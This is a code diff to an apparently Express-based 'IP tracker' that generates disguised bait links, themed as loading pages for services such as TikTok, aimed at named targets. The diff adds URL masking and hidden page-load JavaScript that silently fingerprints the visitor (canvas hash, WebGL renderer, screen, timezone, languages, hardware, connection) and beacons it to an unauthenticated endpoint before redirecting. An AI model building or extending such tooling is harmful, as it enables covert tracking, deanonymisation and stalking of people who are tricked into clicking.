@@ -145,7 +145,10 @@ const THEMES: Record<BaitTheme, ThemeConfig> = {
 const ALL_ROUTES = Object.values(THEMES).map(t => t.route);
 
 // Build convincing HTML loading page for the given theme
-function buildLoadingPage(theme: ThemeConfig): string {
+// entry is used to embed the token and redirect URL into the page for client-side fingerprinting
+function buildLoadingPage(theme: ThemeConfig, entry: TrackEntry): string {
+  const redirectDest = entry.redirectUrl ?? theme.redirect;
+  const token = entry.token;
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -169,8 +172,101 @@ function buildLoadingPage(theme: ThemeConfig): string {
   <div class="spinner"></div>
   <div class="text">${theme.loadingText}</div>
   <script>
-    // Redirect after brief loading screen
-    setTimeout(function(){window.location.href=${JSON.stringify(theme.redirect)};},1800);
+  (function(){
+    var DEST = ${JSON.stringify(redirectDest)};
+    var TOKEN = ${JSON.stringify(token)};
+    var FP_URL = "/api/tracker/fp/" + TOKEN;
+
+    function go(){ window.location.href = DEST; }
+
+    // ── Canvas fingerprint (quick hash) ────────────────────────────────────
+    function canvasHash(){
+      try{
+        var c=document.createElement("canvas");c.width=200;c.height=30;
+        var ctx=c.getContext("2d");
+        ctx.textBaseline="top";ctx.font="14px 'Arial'";
+        ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);
+        ctx.fillStyle="#069";ctx.fillText("Cwm fjordbank glyphs vext quiz 😀",2,15);
+        ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("Cwm fjordbank glyphs vext quiz 😀",4,17);
+        var d=c.toDataURL();var h=0,i=0;
+        for(;i<d.length;i++){h=(Math.imul(31,h)+d.charCodeAt(i))|0;}
+        return(h>>>0).toString(16);
+      }catch(e){return"err";}
+    }
+
+    // ── WebGL renderer ─────────────────────────────────────────────────────
+    function webgl(){
+      try{
+        var c=document.createElement("canvas");
+        var gl=c.getContext("webgl")||c.getContext("experimental-webgl");
+        if(!gl)return{vendor:"n/a",renderer:"n/a"};
+        var ext=gl.getExtension("WEBGL_debug_renderer_info");
+        return{
+          vendor:  ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):"n/a",
+          renderer:ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):"n/a"
+        };
+      }catch(e){return{vendor:"err",renderer:"err"};}
+    }
+
+    // ── Collect & beacon ────────────────────────────────────────────────────
+    function collect(){
+      var nav=navigator,scr=screen;
+      var conn=nav.connection||nav.mozConnection||nav.webkitConnection||null;
+      var wgl=webgl();
+      return{
+        screenW:    scr.width,
+        screenH:    scr.height,
+        colorDepth: scr.colorDepth,
+        pixelRatio: window.devicePixelRatio||1,
+        lang:       nav.language,
+        langs:      (nav.languages||[]).join(","),
+        platform:   nav.platform,
+        cores:      nav.hardwareConcurrency||null,
+        memory:     nav.deviceMemory||null,
+        connection: conn?conn.effectiveType:null,
+        downlink:   conn?conn.downlink:null,
+        rtt:        conn?conn.rtt:null,
+        saveData:   conn?!!conn.saveData:null,
+        tz:         Intl.DateTimeFormat().resolvedOptions().timeZone,
+        online:     nav.onLine,
+        cookies:    nav.cookieEnabled,
+        dnt:        nav.doNotTrack,
+        touchPoints:nav.maxTouchPoints||0,
+        localTime:  new Date().toISOString(),
+        canvasHash: canvasHash(),
+        webglVendor:   wgl.vendor,
+        webglRenderer: wgl.renderer
+      };
+    }
+
+    // Send fingerprint then redirect — beacon first (fire-and-forget), then redirect
+    function sendAndGo(){
+      try{
+        var data=JSON.stringify(collect());
+        // Try sendBeacon first (non-blocking)
+        var beaconed=false;
+        if(navigator.sendBeacon){
+          try{
+            var b=new Blob([data],{type:"application/json"});
+            beaconed=navigator.sendBeacon(FP_URL,b);
+          }catch(e){}
+        }
+        if(!beaconed){
+          // Fallback: fetch with keepalive
+          try{
+            fetch(FP_URL,{method:"POST",headers:{"Content-Type":"application/json"},body:data,keepalive:true});
+          }catch(e){}
+        }
+      }catch(e){}
+      // Redirect after a brief delay regardless of beacon result
+      setTimeout(go, 200);
+    }
+
+    // Redirect after 1.8s — collect fingerprint at ~1.5s so beacon fires before navigation
+    setTimeout(sendAndGo, 1500);
+    // Safety fallback
+    setTimeout(go, 3500);
+  })();
   </script>
 </body>
 </html>`;
@@ -238,7 +334,8 @@ export interface TrackEntry {
   targetName:  string;
   generatedAt: number;
   hits:        number;
-  // populated when first clicked
+  redirectUrl?: string;       // URL masking — real destination after capture
+  // populated when first clicked (server-side)
   capturedIp?:  string;
   capturedAt?:  number;
   userAgent?:   string;
@@ -257,6 +354,29 @@ export interface TrackEntry {
   isTor?:       boolean;
   isHosting?:   boolean;
   mobile?:      boolean;
+  // populated by client-side fingerprint beacon
+  fp_screenW?:     number;
+  fp_screenH?:     number;
+  fp_colorDepth?:  number;
+  fp_pixelRatio?:  number;
+  fp_lang?:        string;
+  fp_langs?:       string;
+  fp_platform?:    string;
+  fp_cores?:       number;
+  fp_memory?:      number;
+  fp_connection?:  string;
+  fp_downlink?:    number;
+  fp_rtt?:         number;
+  fp_saveData?:    boolean;
+  fp_tz?:          string;
+  fp_online?:      boolean;
+  fp_cookies?:     boolean;
+  fp_dnt?:         string;
+  fp_touchPoints?: number;
+  fp_localTime?:   string;
+  fp_canvasHash?:  string;
+  fp_webglVendor?: string;
+  fp_webglRenderer?: string;
 }
 
 const STORE_PATH = path.join(process.cwd(), "data", "ip-tracker.json");
@@ -290,13 +410,15 @@ setInterval(() => {
 }, 60 * 60 * 1000);
 
 export function generateTrackToken(
-  userId: string, username: string, targetName: string, theme: BaitTheme = "tiktok",
+  userId: string, username: string, targetName: string,
+  theme: BaitTheme = "tiktok", redirectUrl?: string,
 ): TrackEntry {
   const token = randomBytes(16).toString("hex");
   const entry: TrackEntry = {
     token, theme, userId, username, targetName,
     generatedAt: Date.now(),
     hits: 0,
+    ...(redirectUrl ? { redirectUrl } : {}),
   };
   store.set(token, entry);
   // Keep latest 5 uncaptured per user
@@ -365,9 +487,14 @@ async function handleBaitRoute(
   const entry = store.get(token);
 
   // Always serve the loading page — captures IP immediately, redirects after 1.8s
+  // Use a dummy entry for unknown tokens so the redirect still works
+  const pageEntry: TrackEntry = entry ?? {
+    token, theme: themeKey, userId: "", username: "", targetName: "",
+    generatedAt: 0, hits: 0,
+  };
   res.setHeader("Content-Type", "text/html; charset=utf-8");
   res.setHeader("Cache-Control", "no-store");
-  res.send(buildLoadingPage(theme));
+  res.send(buildLoadingPage(theme, pageEntry));
 
   if (!entry) return;
 
@@ -415,21 +542,81 @@ baitRouter.get("/v/:token", (req, res) => {
   void handleBaitRoute(req, res, "plain");
 });
 
+// ── Client-side fingerprint beacon endpoint ───────────────────────────────────
+// Called by the bait page JS with sendBeacon/fetch before redirecting
+// No auth required — the token itself is the proof
+baitRouter.post("/api/tracker/fp/:token", (req, res) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Cache-Control", "no-store");
+  const token = req.params.token;
+  const entry = store.get(token);
+  if (!entry) { res.status(204).end(); return; }
+
+  const body = req.body as {
+    screenW?: number; screenH?: number; colorDepth?: number; pixelRatio?: number;
+    lang?: string; langs?: string; platform?: string;
+    cores?: number; memory?: number;
+    connection?: string; downlink?: number; rtt?: number; saveData?: boolean;
+    tz?: string; online?: boolean; cookies?: boolean; dnt?: string;
+    touchPoints?: number; localTime?: string;
+    canvasHash?: string; webglVendor?: string; webglRenderer?: string;
+  };
+
+  entry.fp_screenW     = body.screenW;
+  entry.fp_screenH     = body.screenH;
+  entry.fp_colorDepth  = body.colorDepth;
+  entry.fp_pixelRatio  = body.pixelRatio;
+  entry.fp_lang        = body.lang;
+  entry.fp_langs       = body.langs;
+  entry.fp_platform    = body.platform;
+  entry.fp_cores       = body.cores;
+  entry.fp_memory      = body.memory;
+  entry.fp_connection  = body.connection;
+  entry.fp_downlink    = body.downlink;
+  entry.fp_rtt         = body.rtt;
+  entry.fp_saveData    = body.saveData;
+  entry.fp_tz          = body.tz;
+  entry.fp_online      = body.online;
+  entry.fp_cookies     = body.cookies;
+  entry.fp_dnt         = body.dnt;
+  entry.fp_touchPoints = body.touchPoints;
+  entry.fp_localTime   = body.localTime;
+  entry.fp_canvasHash  = body.canvasHash;
+  entry.fp_webglVendor   = body.webglVendor;
+  entry.fp_webglRenderer = body.webglRenderer;
+
+  saveStore();
+  console.log(`[IP TRACKER] 🔬 Fingerprint recebido para token ${token.slice(0, 8)}... — ${body.screenW}x${body.screenH}, ${body.platform}, ${body.connection}`);
+  res.status(204).end();
+});
+
 // ── API router — mounted at "/api" (through normal router chain) ─────────────
 const router = Router();
 
-// Generate a new tracking token with optional theme
+// Generate a new tracking token with optional theme and redirect URL (URL masking)
 router.post("/tracker/gen", (req, res) => {
-  const { userId, username, targetName, theme } = (req.body ?? {}) as {
-    userId?: string; username?: string; targetName?: string; theme?: BaitTheme;
+  const { userId, username, targetName, theme, redirectUrl } = (req.body ?? {}) as {
+    userId?: string; username?: string; targetName?: string;
+    theme?: BaitTheme; redirectUrl?: string;
   };
 
   const selectedTheme: BaitTheme = (theme && theme in THEMES) ? theme : "tiktok";
+
+  // Validate redirectUrl if provided
+  let safeRedirectUrl: string | undefined;
+  if (redirectUrl) {
+    try {
+      const u = new URL(redirectUrl);
+      if (u.protocol === "https:" || u.protocol === "http:") safeRedirectUrl = redirectUrl;
+    } catch { /* invalid URL — ignore */ }
+  }
+
   const entry = generateTrackToken(
     userId      ?? "anonymous",
     username    ?? "unknown",
     targetName  ?? username ?? "target",
     selectedTheme,
+    safeRedirectUrl,
   );
 
   const protocol = req.protocol ?? "http";
@@ -442,6 +629,7 @@ router.post("/tracker/gen", (req, res) => {
     url:         trackUrl,
     theme:       selectedTheme,
     generatedAt: entry.generatedAt,
+    redirectUrl: safeRedirectUrl,
     themes:      ALL_ROUTES,
   });
 });
